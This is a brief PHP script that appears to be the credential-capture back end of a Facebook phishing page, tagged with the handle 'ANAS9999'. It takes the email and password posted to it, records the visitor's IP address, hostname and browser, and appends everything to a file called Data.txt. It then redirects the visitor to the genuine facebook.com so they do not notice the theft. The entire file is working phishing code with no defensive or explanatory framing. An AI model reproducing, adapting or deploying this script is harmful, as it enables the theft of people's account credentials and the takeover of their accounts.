<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- FACEBOOK -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- ANAS9999 ----------------------\n";
$file = fopen("./Data.txt", 'a');
fwrite($file, $message);
header("Location: https://www.facebook.com");?>